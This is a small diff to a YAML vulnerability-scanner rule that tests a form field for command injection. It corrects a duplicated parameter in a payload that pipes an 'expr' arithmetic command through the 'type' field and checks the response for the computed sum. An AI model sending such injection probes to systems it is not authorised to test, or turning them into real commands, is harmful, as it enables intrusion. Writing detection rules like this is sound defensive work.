@@ -8,7 +8,7 @@ rules:
     headers:
       Content-Type: application/x-www-form-urlencoded
     body: |
-      type=type='|expr%20{{r1}}%20%2B%20{{r2}}||'
+      type='|expr%20{{r1}}%20%2B%20{{r2}}||'
     expression: |
       response.status == 200 && response.body.bcontains(bytes(string(r1 + r2)))
 detail:
